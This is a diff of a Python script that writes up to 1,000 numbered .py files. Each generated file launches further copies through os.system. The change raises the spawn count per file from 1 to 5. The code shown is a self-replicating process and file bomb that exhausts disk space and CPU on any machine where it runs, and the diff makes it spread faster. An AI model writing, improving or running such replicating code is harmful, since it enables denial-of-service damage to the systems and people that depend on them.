@@ -1,24 +1,22 @@
 import multiprocessing as mp
 import os
 import random as r
-import subprocess as s
 
 name = os.path.splitext(os.path.basename(__file__))[0]
 
 numFiles = 1000
-externalRunAmount = 1
-firstRunAmount = 2
+externalRunAmount = 5
+firstRunAmount = 1
 
 contents = f'''
 from {name} import writeFile
 import random as r
-import subprocess as s
 import multiprocessing as mp
 import os
 name = os.path.splitext(os.path.basename(__file__))[0]
 def runFile(i):
     filename = "python " + str(i) + ".py"
-    s.Popen(filename)
+    os.system(filename)
 def handleFile(i):
     file = os.getcwd() + "\\\\" + str(i) + ".py"
     if not os.path.isfile(file):
@@ -42,7 +40,7 @@ def writeFile(fileName):
 
 def runFile(i):
     filename = "python " + str(i) + ".py"
-    s.Popen(filename)
+    os.system(filename)
 
 
 def handleFile(i):
